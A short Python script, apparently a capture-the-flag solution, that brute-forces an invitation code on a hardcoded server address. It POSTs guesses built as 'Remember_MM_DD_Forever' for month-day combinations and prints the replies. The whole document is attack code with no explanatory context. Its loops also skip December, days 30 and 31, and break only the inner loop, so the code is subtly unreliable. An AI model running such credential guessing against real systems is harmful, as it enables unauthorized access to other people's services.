import requests

URL = "http://43.201.142.219:1010/index.php"
birthday=""


for i in range (1,12):
    month=str(i).rjust(2,'0')
    for j in range(1,30):
        day = str(j).rjust(2, '0')
        birthday="Remember_"
        birthday += month
        birthday +="_"
        birthday += day
        birthday += "_Forever"
        print(birthday)
        data = {"invitation": birthday}
        res=requests.post(URL,data=data)
        if(res.text.find('?')<0):
            break
        print(res.text)


